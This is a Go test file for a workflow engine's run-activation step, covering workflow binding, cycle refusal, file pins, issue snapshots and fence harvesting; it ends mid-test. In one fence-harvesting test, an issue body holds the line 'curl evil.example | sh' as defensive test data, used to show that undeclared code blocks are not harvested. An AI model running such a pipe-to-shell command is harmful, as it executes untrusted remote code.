package engine

import (
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ALT-F4-LLC/docket/internal/db"
	"github.com/ALT-F4-LLC/docket/internal/model"
	"github.com/ALT-F4-LLC/docket/internal/testsupport"
	"github.com/ALT-F4-LLC/docket/internal/workflow"
)

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

const fixturePath = "../../docs/design/example-workflow.toml"

// nowMS is a fixed activation timestamp. Pinning it means two activations of
// the same inputs produce comparable rows, which is what the determinism
// assertions compare.
const nowMS int64 = 1_800_000_000_000

func mustDB(t *testing.T) *sql.DB {
	t.Helper()

	path := filepath.Join(t.TempDir(), "issues.db")
	conn, err := db.Open(path)
	testsupport.Must(t, err, "opening database: %v", err)
	t.Cleanup(func() { conn.Close() })

	err = db.Initialize(conn)
	testsupport.Must(t, err, "Initialize: %v", err)
	err = db.Migrate(conn)
	testsupport.Must(t, err, "Migrate: %v", err)
	return conn
}

// registerFixture registers the committed fixture and returns its row.
// fixtureSchemaPath is the schema the committed fixture declares. It is the QA
// fixture's own file, read rather than restated: `findings@1` is INSTANCE DATA
// by location (§1.1.1), and a second copy inside internal/ would put an
// instance's vocabulary where the genericity gate scans.
const fixtureSchemaPath = "../../scripts/qa/fixtures/schemas/findings@1.json"

// registerFixture registers the committed fixture AND the schema it declares,
// in that order (§4.6: schemas before workflows).
//
// The schema half is not test scaffolding. The fixture's
// `reconcile` declares `payload = "findings@1"`, which V29 requires of every
// `aggregate` step, so a repo that has not registered it cannot register the
// workflow and cannot activate a run over it. Registering both here is what the
// real flow does; a helper that skipped it would be testing a state no operator
// can reach.
func registerFixture(t *testing.T, conn *sql.DB) *model.Workflow {
	t.Helper()
	registerFixtureSchema(t, conn)
	src, err := os.ReadFile(fixturePath)
	testsupport.Must(t, err, "reading fixture: %v", err)
	return registerSource(t, conn, src, fixturePath)
}

// registerFixtureSchema registers `findings@1` from the QA fixture file.
func registerFixtureSchema(t *testing.T, conn *sql.DB) {
	t.Helper()
	body, err := os.ReadFile(fixtureSchemaPath)
	testsupport.Must(t, err, "reading the fixture's schema: %v", err)
	registerSchemaFixture(t, conn, "findings", 1, string(body))
}

// registerSource registers arbitrary TOML, through the same parse-validate-lint
// path `workflow register` uses — a test that inserted a row directly could
// register a definition no operator could.
func registerSource(t *testing.T, conn *sql.DB, src []byte, path string) *model.Workflow {
	t.Helper()

	def, err := workflow.Parse(src)
	testsupport.Must(t, err, "parsing %s: %v", path, err)
	err = workflow.Validate(def)
	testsupport.Must(t, err, "validating %s: %v", path, err)
	err = workflow.Lint(def)
	testsupport.Must(t, err, "linting %s: %v", path, err)
	parsed, err := workflow.Canonical(def)
	testsupport.Must(t, err, "serializing %s: %v", path, err)

	stored, _, err := db.InsertWorkflow(conn, &model.Workflow{
		Name: def.Pipeline.Name, Version: def.Pipeline.Version,
		Description: def.Pipeline.Description, SourcePath: path,
		SourceSHA256: workflow.SHA256(src), Body: string(src), Parsed: string(parsed),
	}, nowMS)
	testsupport.Must(t, err, "registering %s: %v", path, err)
	return stored
}

// createIssue inserts an issue with labels, through the ordinary db path.
func createIssue(t *testing.T, conn *sql.DB, title, body, kind string, labels []string) int {
	t.Helper()
	id, err := db.CreateIssue(conn, &model.Issue{
		Title: title, Description: body, Status: model.StatusBacklog,
		Priority: model.PriorityNone, Kind: model.IssueKind(kind),
	}, labels, nil)
	testsupport.Must(t, err, "creating issue %q: %v", title, err)
	return id
}

// startRun creates a run and attaches issues.
func startRun(t *testing.T, conn *sql.DB, issueIDs ...int) *model.Run {
	t.Helper()
	run, err := db.InsertRun(conn, 1, "test run", 0, nowMS)
	testsupport.Must(t, err, "starting run: %v", err)
	for _, id := range issueIDs {
		err := db.AddRunIssue(conn, run.ID, id)
		testsupport.Must(t, err, "adding issue %d to run: %v", id, err)
	}
	return run
}

// activate runs the fat transaction with the fixed timestamp.
func activate(conn *sql.DB, runID int, pins ...string) (*ActivateResult, error) {
	return Activate(conn, runID, ActivateOptions{FilePins: pins, NowMS: nowMS})
}

// countRows is the "nothing was written" probe the atomicity assertions use.
func countRows(t *testing.T, conn *sql.DB, table string) int {
	t.Helper()
	var n int
	err := conn.QueryRow(`SELECT COUNT(*) FROM ` + table).Scan(&n)
	testsupport.Must(t, err, "counting %s: %v", table, err)
	return n
}

// ---------------------------------------------------------------------------
// Stage 1 — binding, and exactly-one-match
// ---------------------------------------------------------------------------

// TestActivateBindsExactlyOneWorkflow is the happy path of stage 1, and the
// baseline every refusal below is measured against.
func TestActivateBindsExactlyOneWorkflow(t *testing.T) {
	conn := mustDB(t)
	wf := registerFixture(t, conn)
	issue := createIssue(t, conn, "do the thing", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	if result.Run.Status != model.RunActive {
		t.Errorf("run status = %q, want %q", result.Run.Status, model.RunActive)
	}
	if result.Run.ActivatedAtMS == nil || *result.Run.ActivatedAtMS != nowMS {
		t.Errorf("activated_at_ms = %v, want %d", result.Run.ActivatedAtMS, nowMS)
	}
	if result.IssuesBound != 1 || result.IssuesExpanded != 1 {
		t.Errorf("bound %d / expanded %d issues, want 1 / 1",
			result.IssuesBound, result.IssuesExpanded)
	}

	runIssues, err := db.ListRunIssues(conn, run.ID)
	testsupport.Must(t, err, "listing run issues: %v", err)
	if len(runIssues) != 1 {
		t.Fatalf("run has %d issues, want 1", len(runIssues))
	}
	if runIssues[0].WorkflowID == nil || *runIssues[0].WorkflowID != wf.ID {
		t.Errorf("binding = %v, want workflow id %d", runIssues[0].WorkflowID, wf.ID)
	}
}

// activatedEventData is the run-activated event's decoded payload. Decoding
// through this type (rather than substring-matching the raw JSON bytes)
// means the assertions survive encoding/json's exact spacing and can pin an
// escaped value — a reason containing a quote or a newline — without a
// hand-escaped literal.
type activatedEventData struct {
	Reason string `json:"reason"`
}

// TestActivateRecordsReasonAndTimestampOnTheActivatedEvent is DKT-53/DKT-56:
// an optional operator-supplied reason rides on the run-activated event's
// data (mirroring MoveRun's and SetRunBudget's {"reason": ...} pattern), and
// the event's AtMS is set from opts.NowMS rather than falling back to
// wall-clock time. The reason carries a quote and a newline, so the
// assertion also pins the round trip through JSON's escaping.
func TestActivateRecordsReasonAndTimestampOnTheActivatedEvent(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "do the thing", "a body", "task", nil)
	run := startRun(t, conn, issue)

	const reason = "operator kickoff: \"urgent\"\nsecond line"
	_, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS, Reason: reason})
	testsupport.Must(t, err, "activate: %v", err)

	page, err := ListEvents(conn, EventQuery{RunID: run.ID})
	testsupport.Must(t, err, "ListEvents: %v", err)

	event, ok := findEvent(t, page, EventRunActivated)
	if !ok {
		t.Fatal("no run-activated event recorded")
	}
	var data activatedEventData
	testsupport.Must(t, json.Unmarshal(event.Data, &data), "decoding data: %v", err)
	if data.Reason != reason {
		t.Errorf("run-activated reason = %q, want %q", data.Reason, reason)
	}
	if event.AtMS != nowMS {
		t.Errorf("run-activated AtMS = %d, want %d (opts.NowMS)", event.AtMS, nowMS)
	}
}

// TestActivateWithoutReasonOmitsTheReasonKey pins the no-reason case:
// activation still succeeds, and the event's data carries no `reason` key —
// matching §17's "a field that is not a fact does not appear" rule the rest
// of the wire follows. §7.6's writer normalizes an event with no fields to
// the empty JSON object, `{}`, never to an empty string, so that is the
// value asserted here rather than the empty string.
func TestActivateWithoutReasonOmitsTheReasonKey(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "do the thing", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS})
	testsupport.Must(t, err, "activate: %v", err)

	page, err := ListEvents(conn, EventQuery{RunID: run.ID})
	testsupport.Must(t, err, "ListEvents: %v", err)

	event, ok := findEvent(t, page, EventRunActivated)
	if !ok {
		t.Fatal("no run-activated event recorded")
	}
	if string(event.Data) != "{}" {
		t.Errorf("run-activated data = %s, want the empty JSON object", event.Data)
	}
	var fields map[string]json.RawMessage
	testsupport.Must(t, json.Unmarshal(event.Data, &fields), "decoding data: %v", err)
	if _, ok := fields["reason"]; ok {
		t.Errorf("run-activated data %s carries a reason key with no reason given", event.Data)
	}
	if event.AtMS != nowMS {
		t.Errorf("run-activated AtMS = %d, want %d (opts.NowMS)", event.AtMS, nowMS)
	}
}

// TestActivateReactivationRecordsItsOwnReason is DKT-56-CL9: a reason is not
// only tested on a FIRST activation. Re-activating carries its own
// independent reason on its own run-activated event, rather than the first
// activation's reason leaking forward or the second being silently dropped.
func TestActivateReactivationRecordsItsOwnReason(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "do the thing", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS, Reason: "first activation"})
	testsupport.Must(t, err, "first activate: %v", err)

	result, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS + 1000, Reason: "second activation"})
	testsupport.Must(t, err, "re-activate: %v", err)
	if !result.Reactivation {
		t.Fatal("second activate did not report itself as a re-activation")
	}

	page, err := ListEvents(conn, EventQuery{RunID: run.ID})
	testsupport.Must(t, err, "ListEvents: %v", err)

	var reasons []string
	for _, e := range page.Events {
		if e.Kind != EventRunActivated {
			continue
		}
		var data activatedEventData
		testsupport.Must(t, json.Unmarshal(e.Data, &data), "decoding data: %v", err)
		reasons = append(reasons, data.Reason)
	}
	want := []string{"first activation", "second activation"}
	if len(reasons) != len(want) || reasons[0] != want[0] || reasons[1] != want[1] {
		t.Errorf("run-activated reasons = %v, want %v (seq order)", reasons, want)
	}
}

// TestActivateDryRunWithReasonWritesNothing is DKT-56-CL9's other half:
// `--dry-run` combined with `--reason` still rolls back the whole
// transaction, so no run-activated event — carrying the reason or otherwise
// — is ever committed.
func TestActivateDryRunWithReasonWritesNothing(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "do the thing", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := Activate(conn, run.ID, ActivateOptions{
		NowMS: nowMS, DryRun: true, Reason: "would this persist",
	})
	testsupport.Must(t, err, "dry-run activate: %v", err)
	if !result.DryRun {
		t.Fatal("result does not report itself as a dry run")
	}

	page, err := ListEvents(conn, EventQuery{RunID: run.ID})
	testsupport.Must(t, err, "ListEvents: %v", err)
	if _, ok := findEvent(t, page, EventRunActivated); ok {
		t.Error("a dry run committed a run-activated event; --dry-run must write nothing")
	}
}

// TestActivateRefusesZeroMatches is half of the exactly-one-match rule. The
// error must name the ISSUE and the CANDIDATES: the issue so an operator knows
// which of twenty to fix, the candidates so they know whether to narrow a
// [match] or write one.
func TestActivateRefusesZeroMatches(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	// The fixture's [match] lists task/feature/bug/chore. `epic` is not among
	// them, so nothing binds.
	issue := createIssue(t, conn, "an epic", "a body", "epic", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded on an issue no workflow matches")
	}
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}

	msg := err.Error()
	if !strings.Contains(msg, model.FormatID(issue)) {
		t.Errorf("error does not name the issue %s: %s", model.FormatID(issue), msg)
	}
	if !strings.Contains(msg, "standard-change@1") {
		t.Errorf("error does not name the candidate workflows: %s", msg)
	}

	// Fat transaction: a refusal at stage 1 leaves nothing behind.
	assertNothingWritten(t, conn)
}

// TestActivateRefusesMultipleMatches is the other half. Two workflows whose
// [match] clauses both admit the issue is an ambiguity core refuses rather than
// resolves — picking one would be an opinion about which pipeline an operator
// meant.
func TestActivateRefusesMultipleMatches(t *testing.T) {
	conn := mustDB(t)
	registerSource(t, conn, []byte(`
[pipeline]
name = "alpha"
version = 1
[match]
kind = ["task"]
[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`), "alpha.toml")
	registerSource(t, conn, []byte(`
[pipeline]
name = "beta"
version = 1
[match]
kind = ["task"]
[[step]]
name = "work"
executor = "worker"
emits = "result"
after = []
`), "beta.toml")

	issue := createIssue(t, conn, "ambiguous", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded on an issue two workflows match")
	}
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}

	msg := err.Error()
	if !strings.Contains(msg, model.FormatID(issue)) {
		t.Errorf("error does not name the issue: %s", msg)
	}
	// EVERY candidate, not just the first: an operator resolving the ambiguity
	// needs the whole set.
	for _, ref := range []string{"alpha@1", "beta@1"} {
		if !strings.Contains(msg, ref) {
			t.Errorf("error does not name candidate %s: %s", ref, msg)
		}
	}

	assertNothingWritten(t, conn)
}

// TestActivateRefusesRunWithNoIssues covers the §5.5 row. A run with nothing in
// it has no topology to expand, and flipping it `active` would leave a run
// nothing will ever schedule and nobody will notice.
func TestActivateRefusesRunWithNoIssues(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	run := startRun(t, conn)

	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded on a run with no issues")
	}
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}

	after, err := db.GetRun(conn, run.ID)
	testsupport.Must(t, err, "reading run: %v", err)
	if after.Status != model.RunPlanning {
		t.Errorf("run status = %q after a refused activation, want %q",
			after.Status, model.RunPlanning)
	}
}

// TestActivateRefusesMissingRun covers the §5.5 NOT_FOUND row.
func TestActivateRefusesMissingRun(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	_, err := activate(conn, 999)
	if err == nil {
		t.Fatal("activate succeeded on a run that does not exist")
	}
	if code, _ := CodeOf(err); code != CodeNotFound {
		t.Errorf("error code = %q, want %q", code, CodeNotFound)
	}
}

// ---------------------------------------------------------------------------
// Stage 2 — the work-DAG lint
// ---------------------------------------------------------------------------

// TestActivateRefusesWorkDAGCycle is stage 2: planner.TopoSort's CycleError,
// re-rendered as a VALIDATION_ERROR. The planner is REUSED, not duplicated —
// the graph is already over issue IDs, so its DKT-N rendering is the right
// vocabulary and needs no adaptation.
func TestActivateRefusesWorkDAGCycle(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	a := createIssue(t, conn, "a", "body a", "task", nil)
	b := createIssue(t, conn, "b", "body b", "task", nil)
	c := createIssue(t, conn, "c", "body c", "task", nil)

	// a -> b -> c -> a, seeded directly. `issue link`'s own checks guard the
	// verb — a schema trigger refuses the 2-cycle and checkCycleTx refuses the
	// rest — so the rows are written beneath them to construct the state
	// activation must refuse on its own. A 3-cycle is also the better test:
	// it is what a real dependency graph gets wrong, and it exercises Kahn's
	// algorithm rather than a trigger.
	for _, rel := range [][2]int{{a, b}, {b, c}, {c, a}} {
		_, err := conn.Exec(
			`INSERT INTO issue_relations (source_issue_id, target_issue_id, relation_type, created_at)
			 VALUES (?, ?, 'depends_on', '2026-08-02T00:00:00Z')`,
			rel[0], rel[1],
		)
		testsupport.Must(t, err, "seeding relation: %v", err)
	}

	run := startRun(t, conn, a, b, c)

	_, err := activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded over a cyclic work graph")
	}
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}
	if !strings.Contains(err.Error(), "cycle") {
		t.Errorf("error does not mention the cycle: %s", err)
	}
	// Every member named, in the planner's own DKT-N rendering.
	for _, id := range []int{a, b, c} {
		if !strings.Contains(err.Error(), model.FormatID(id)) {
			t.Errorf("cycle error does not name %s: %s", model.FormatID(id), err)
		}
	}

	assertNothingWritten(t, conn)
}

// ---------------------------------------------------------------------------
// Stage 3 — pins
// ---------------------------------------------------------------------------

// TestActivatePinsWorkflowAndFiles asserts both pin kinds and both hashes: the
// workflow pin's hash equals workflows.source_sha256, and a --pin file's hash
// equals that file's SHA-256.
func TestActivatePinsWorkflowAndFiles(t *testing.T) {
	conn := mustDB(t)
	wf := registerFixture(t, conn)
	issue := createIssue(t, conn, "pinned", "a body", "task", nil)
	run := startRun(t, conn, issue)

	contractPath := filepath.Join(t.TempDir(), "contract.md")
	content := []byte("a contract core never reads the meaning of\n")
	err := os.WriteFile(contractPath, content, 0o644)
	testsupport.Must(t, err, "writing pin file: %v", err)

	_, err = activate(conn, run.ID, contractPath)
	testsupport.Must(t, err, "activate: %v", err)

	pins, err := db.ListPins(conn, run.ID)
	testsupport.Must(t, err, "listing pins: %v", err)

	// Four: the workflow, the --pin file, `aggregate@1`, and `findings@1`. The
	// first schema is the builtin the fixture's `reconcile` step brings in by
	// being `action = "aggregate"` (§4.7 P5) — it pins like any other registered
	// object, because that its bytes ship in the binary changes where they came
	// from, not whether the run records what it used. The second is the schema
	// that same step now DECLARES (V29), which is what makes its ordered
	// `any(severity >= high)` evaluable at all.
	if len(pins) != 4 {
		t.Fatalf("recorded %d pins, want 4 (workflow, file, two schemas): %+v",
			len(pins), pins)
	}

	byKind := make(map[string]db.Pin, len(pins))
	for _, p := range pins {
		byKind[p.Kind] = p
	}

	workflowPin, ok := byKind[db.PinKindWorkflow]
	if !ok {
		t.Fatal("no workflow pin recorded")
	}
	if workflowPin.Ref != wf.Ref() {
		t.Errorf("workflow pin ref = %q, want %q", workflowPin.Ref, wf.Ref())
	}
	if workflowPin.SHA256 != wf.SourceSHA256 {
		t.Errorf("workflow pin hash = %q, want workflows.source_sha256 %q",
			workflowPin.SHA256, wf.SourceSHA256)
	}

	filePin, ok := byKind[db.PinKindFile]
	if !ok {
		t.Fatal("no file pin recorded")
	}
	if filePin.Ref != contractPath {
		t.Errorf("file pin ref = %q, want the path as given %q", filePin.Ref, contractPath)
	}
	if want := workflow.SHA256(content); filePin.SHA256 != want {
		t.Errorf("file pin hash = %q, want the file's SHA-256 %q", filePin.SHA256, want)
	}
}

// TestActivateMissingPinWritesNothing is the pin-atomicity obligation, stated
// by §5.7 as "assert NO run rows, no steps, no pins written — the transaction
// is fat, so a failure leaves nothing".
//
// Pinning is never partial: a run pinned to some of what its operator named is
// a run that cannot reproduce itself and cannot say which part is missing.
func TestActivateMissingPinWritesNothing(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "unpinnable", "a body", "task", nil)
	run := startRun(t, conn, issue)

	good := filepath.Join(t.TempDir(), "present.md")
	err := os.WriteFile(good, []byte("here"), 0o644)
	testsupport.Must(t, err, "writing pin file: %v", err)
	missing := filepath.Join(t.TempDir(), "absent.md")

	// The GOOD pin comes first, so a naive implementation that wrote pins as
	// it read them would leave exactly one row behind — which is the partial
	// state this test exists to forbid.
	_, err = activate(conn, run.ID, good, missing)
	if err == nil {
		t.Fatal("activate succeeded with a --pin path that does not exist")
	}
	if code, _ := CodeOf(err); code != CodeNotFound {
		t.Errorf("error code = %q, want %q", code, CodeNotFound)
	}
	if !strings.Contains(err.Error(), missing) {
		t.Errorf("error does not name the missing path: %s", err)
	}

	assertNothingWritten(t, conn)

	// And the run itself is untouched: still `planning`, never activated.
	after, err := db.GetRun(conn, run.ID)
	testsupport.Must(t, err, "reading run: %v", err)
	if after.Status != model.RunPlanning {
		t.Errorf("run status = %q after a refused activation, want %q",
			after.Status, model.RunPlanning)
	}
	if after.ActivatedAtMS != nil {
		t.Errorf("activated_at_ms = %v after a refused activation, want NULL",
			*after.ActivatedAtMS)
	}
}

// TestActivateRefusesDirectoryPin covers the "not a regular file" half of the
// §5.3 stage-3 rule. A directory has no content to hash, so pinning one would
// record a hash of nothing and call the run reproducible.
func TestActivateRefusesDirectoryPin(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "dir pin", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID, t.TempDir())
	if err == nil {
		t.Fatal("activate succeeded with a directory as a --pin path")
	}
	if code, _ := CodeOf(err); code != CodeNotFound {
		t.Errorf("error code = %q, want %q", code, CodeNotFound)
	}
	if !strings.Contains(err.Error(), "not a regular file") {
		t.Errorf("error does not say why the path was refused: %s", err)
	}

	assertNothingWritten(t, conn)
}

// nothingWrittenTables lists the tables that must carry no rows for a run
// whose activation refused. Both assertNothingWritten (unscoped) and
// assertNothingWrittenForRun (scoped to one run) read this single list, so a
// fifth table added to the fat transaction cannot go stale in only one of
// them.
var nothingWrittenTables = []string{"steps", "pins", "run_fences"}

// nothingWrittenBindingPredicate is the SQL fragment identifying a run_issues
// row that carries a binding or snapshot. Shared by both assertNothingWritten
// helpers for the same reason as nothingWrittenTables: one copy of the
// invariant.
const nothingWrittenBindingPredicate = `workflow_id IS NOT NULL
	    OR body_snapshot IS NOT NULL OR issue_snapshot IS NOT NULL
	    OR expanded_at_ms IS NOT NULL`

// assertNothingWritten is the fat transaction's contract: a refusal at any
// stage leaves no steps, no pins, no fences, and no bindings.
//
// `runs` and `run_issues` are excluded on purpose — `run start` created those
// BEFORE the activation and they are not activation's to roll back. What
// activation must not leave behind is its own work, and the binding columns
// are checked separately below because they live on a row that legitimately
// survives.
func assertNothingWritten(t *testing.T, conn *sql.DB) {
	t.Helper()

	for _, table := range nothingWrittenTables {
		if n := countRows(t, conn, table); n != 0 {
			t.Errorf("%s has %d rows after a refused activation, want 0", table, n)
		}
	}

	var bound int
	err := conn.QueryRow(
		`SELECT COUNT(*) FROM run_issues WHERE ` + nothingWrittenBindingPredicate,
	).Scan(&bound)
	testsupport.Must(t, err, "counting bound run issues: %v", err)
	if bound != 0 {
		t.Errorf("%d run_issues rows carry a binding or snapshot after a refused "+
			"activation, want 0", bound)
	}
}

// assertNothingWrittenForRun is assertNothingWritten scoped to one run: for
// tests where an EARLIER, unrelated activation already succeeded on the same
// connection (e.g. to arrange registration state), so the global row count
// assertNothingWritten takes would double-count that prior run's own steps,
// pins and binding.
func assertNothingWrittenForRun(t *testing.T, conn *sql.DB, runID int) {
	t.Helper()

	for _, table := range nothingWrittenTables {
		var n int
		err := conn.QueryRow(
			fmt.Sprintf(`SELECT COUNT(*) FROM %s WHERE run_id = ?`, table), runID,
		).Scan(&n)
		testsupport.Must(t, err, "counting %s for run %d: %v", table, runID, err)
		if n != 0 {
			t.Errorf("%s has %d rows for run %d after a refused activation, want 0",
				table, n, runID)
		}
	}

	var bound int
	err := conn.QueryRow(
		`SELECT COUNT(*) FROM run_issues WHERE run_id = ? AND (`+nothingWrittenBindingPredicate+`)`,
		runID,
	).Scan(&bound)
	testsupport.Must(t, err, "counting bound run issues for run %d: %v", runID, err)
	if bound != 0 {
		t.Errorf("%d run_issues rows carry a binding or snapshot for run %d "+
			"after a refused activation, want 0", bound, runID)
	}
}

// ---------------------------------------------------------------------------
// Stage 4 — snapshots
// ---------------------------------------------------------------------------

// TestActivateSnapshotsBodyAndFields is stage 4 and §5.1.1 together: the body,
// its hash, and the canonical JSON of {title, kind, labels, scope}.
func TestActivateSnapshotsBodyAndFields(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	body := "the body as it read at activation"
	issue := createIssue(t, conn, "snapshot me", body, "task", []string{"beta", "alpha"})
	err := db.SetIssueScopeGlobs(conn, issue, `["internal/db/**"]`)
	testsupport.Must(t, err, "setting scope: %v", err)
	run := startRun(t, conn, issue)

	_, err = activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	ri := runIssueOf(t, conn, run.ID, issue)

	if ri.BodySnapshot != body {
		t.Errorf("body_snapshot = %q, want %q", ri.BodySnapshot, body)
	}
	if want := workflow.SHA256([]byte(body)); ri.BodySHA256 != want {
		t.Errorf("body_sha256 = %q, want %q", ri.BodySHA256, want)
	}

	// Canonical JSON: sorted keys, labels sorted for stability, scope as
	// stored. The exact bytes are asserted because context bundles are
	// golden-diffed and a reordering here makes the goldens flap.
	want := `{"title":"snapshot me","kind":"task","labels":["alpha","beta"],` +
		`"scope":["internal/db/**"]}`
	if ri.IssueSnapshot != want {
		t.Errorf("issue_snapshot =\n  %s\nwant\n  %s", ri.IssueSnapshot, want)
	}
}

// TestSnapshotIsStableAcrossSerializations applies the same discipline `parsed`
// gets: the snapshot must serialize byte-identically every time, or the §8.3
// goldens flap on nothing.
func TestSnapshotIsStableAcrossSerializations(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	issue := createIssue(t, conn, "stable", "body", "task",
		[]string{"zeta", "alpha", "mu"})
	err := db.SetIssueScopeGlobs(conn, issue, `["a/**","b/**","c/**"]`)
	testsupport.Must(t, err, "setting scope: %v", err)

	var want string
	for i := 0; i < 100; i++ {
		run := startRun(t, conn, issue)
		_, err := activate(conn, run.ID)
		testsupport.Must(t, err, "activate %d: %v", i, err)
		got := runIssueOf(t, conn, run.ID, issue).IssueSnapshot
		if i == 0 {
			want = got
			continue
		}
		if got != want {
			t.Fatalf("snapshot %d differs:\n got %s\nwant %s", i, got, want)
		}
	}
}

// TestSnapshotSurvivesMidRunEdits is §9 item 5's immunity at the storage
// layer, and the reason title/kind/labels/scope are snapshot COLUMNS rather
// than a join against `issues`.
//
// Each mutated field is asserted individually, so a partial snapshot fails on
// the specific field it missed instead of on an opaque whole-blob diff — which
// is the difference between "the title is read live" and "something changed".
func TestSnapshotSurvivesMidRunEdits(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	issue := createIssue(t, conn, "original title", "original body", "task",
		[]string{"original-label"})
	err := db.SetIssueScopeGlobs(conn, issue, `["original/**"]`)
	testsupport.Must(t, err, "setting scope: %v", err)
	run := startRun(t, conn, issue)

	_, err = activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)
	before := runIssueOf(t, conn, run.ID, issue)

	// Every one of the five snapshotted facts is now edited.
	err = db.UpdateIssue(conn, issue, map[string]any{
		"title":       "edited title",
		"description": "edited body",
		"kind":        "bug",
	}, "")
	testsupport.Must(t, err, "editing issue: %v", err)
	err = db.AddLabelToIssue(conn, issue, "added-label", "", "")
	testsupport.Must(t, err, "adding label: %v", err)
	err = db.SetIssueScopeGlobs(conn, issue, `["edited/**"]`)
	testsupport.Must(t, err, "editing scope: %v", err)

	after := runIssueOf(t, conn, run.ID, issue)

	if after.BodySnapshot != before.BodySnapshot {
		t.Errorf("body_snapshot changed after an edit: %q -> %q",
			before.BodySnapshot, after.BodySnapshot)
	}
	if after.BodySHA256 != before.BodySHA256 {
		t.Errorf("body_sha256 changed after an edit")
	}

	var snapshot struct {
		Title  string   `json:"title"`
		Kind   string   `json:"kind"`
		Labels []string `json:"labels"`
		Scope  []string `json:"scope"`
	}
	err = json.Unmarshal([]byte(after.IssueSnapshot), &snapshot)
	testsupport.Must(t, err, "reading snapshot: %v", err)

	if snapshot.Title != "original title" {
		t.Errorf("snapshot title = %q after an edit, want the activation-time value",
			snapshot.Title)
	}
	if snapshot.Kind != "task" {
		t.Errorf("snapshot kind = %q after an edit, want \"task\"", snapshot.Kind)
	}
	if len(snapshot.Labels) != 1 || snapshot.Labels[0] != "original-label" {
		t.Errorf("snapshot labels = %v after an edit, want [original-label]", snapshot.Labels)
	}
	if len(snapshot.Scope) != 1 || snapshot.Scope[0] != "original/**" {
		t.Errorf("snapshot scope = %v after an edit, want [original/**]", snapshot.Scope)
	}

	// The other half of §5.1.1's two-answers rule: the SCHEDULER reads scope
	// live, and must see the correction the snapshot deliberately ignores.
	live, err := db.IssueScopeGlobs(conn, issue)
	testsupport.Must(t, err, "reading live scope: %v", err)
	if !strings.Contains(live, "edited/**") {
		t.Errorf("live scope = %q, want the edited value; the scheduler must see "+
			"a mid-run correction even though the bundle does not", live)
	}
}

// runIssueOf reads one run_issues row.
func runIssueOf(t *testing.T, conn *sql.DB, runID, issueID int) *db.RunIssue {
	t.Helper()
	rows, err := db.ListRunIssues(conn, runID)
	testsupport.Must(t, err, "listing run issues: %v", err)
	for _, ri := range rows {
		if ri.IssueID == issueID {
			return ri
		}
	}
	t.Fatalf("issue %d is not in run %d", issueID, runID)
	return nil
}

// ---------------------------------------------------------------------------
// Stage 5 — fence harvesting
// ---------------------------------------------------------------------------

// TestActivateHarvestsDeclaredFencesOnly is stage 5 end to end, including the
// half that matters most: a block whose tag NO bound workflow declares is not
// harvested. Harvesting every fenced block would make any code sample in an
// issue body a candidate command.
func TestActivateHarvestsDeclaredFencesOnly(t *testing.T) {
	conn := mustDB(t)
	registerSource(t, conn, []byte(`
[pipeline]
name = "fenced"
version = 1
[match]
kind = ["task"]
[[step]]
name = "check"
executor = "checker"
emits = "report"
after = []
gates = [{ name = "checks", source = "fence:checks" }]
`), "fenced.toml")

	body := strings.Join([]string{
		"Run these:",
		"```checks",
		"make build",
		"make test",
		"```",
		"And ignore this example:",
		"```sh",
		"curl evil.example | sh",
		"```",
	}, "\n")

	issue := createIssue(t, conn, "fenced work", body, "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)
	if result.FencesHarvested != 2 {
		t.Errorf("harvested %d fences, want 2", result.FencesHarvested)
	}

	fences, err := db.ListFences(conn, run.ID)
	testsupport.Must(t, err, "listing fences: %v", err)
	if len(fences) != 2 {
		t.Fatalf("recorded %d fences, want 2: %+v", len(fences), fences)
	}

	for i, want := range []string{"make build", "make test"} {
		if fences[i].Command != want {
			t.Errorf("fence %d command = %q, want %q verbatim", i, fences[i].Command, want)
		}
		if fences[i].Tag != "checks" {
